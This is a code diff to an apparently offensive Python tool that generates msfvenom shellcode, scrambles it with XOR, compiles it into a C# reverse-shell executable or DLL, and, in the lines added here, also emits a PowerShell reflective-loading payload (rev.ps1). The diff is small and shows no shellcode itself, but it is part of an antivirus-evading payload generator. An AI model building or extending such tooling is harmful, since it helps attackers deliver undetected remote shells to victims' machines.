@@ -10,10 +10,10 @@ from helpers.colorize import *
 from helpers.log import logger
 from helpers.args import generate_cli_args
 from helpers.generate_csharp_payload import generate_csharp_payload
+from helpers.powershell_reflection import powershell_reflection_generate
 
 # Shellcode Scramblers
 from shellcode_scrambler.xor_encryptor import xor_encryptor
-
 
 
 # Generate the msfvenom shellcode and put it in the /tmp/sharpevader_tmp/msf_shellcode.hex
@@ -57,7 +57,7 @@ def compile_csharp_code(mode="exe",nobin=False):
         logger.debug(f"Mono mcs logs : \n{op}")
         logger.debug(f"Created {cwd}/rev.exe")
     elif mode == "dll":
-        subprocess.run(f"mcs -target:library -out:{cwd}/rev.dll /tmp/sharpevader_tmp/magisk.cs".split(), stdout=subprocess.PIPE,stderr=subprocess.STDOUT).stdout.decode()
+        op = subprocess.run(f"mcs -target:library -out:{cwd}/rev.dll /tmp/sharpevader_tmp/magisk.cs".split(), stdout=subprocess.PIPE,stderr=subprocess.STDOUT).stdout.decode()
         logger.debug(f"Mono mcs logs : \n{op}")
         logger.debug(f"Created {cwd}/rev.dll")
 
@@ -177,6 +177,11 @@ def main():
     compile_csharp_code(mode=mode,nobin=args.nobin)
     print_log(f"{green}{bold}[+]{end}  Payload generated : {bold}{teal}{cwd}/rev.{mode}",args.lh,args.lp,level=logger.level)
     
+    # Generate powershell reflection of the file
+    if not args.nops1:
+        powershell_reflection_generate(f"{cwd}/rev.{mode}",script_path,os.getcwd())
+        print_log(f"{green}{bold}[+]{end}  Reflection Payload generated : {bold}{teal}{cwd}/rev.ps1",args.lh,args.lp,level=logger.level)
+
     # Cleaning up the /tmp directory
     cleanup()
 
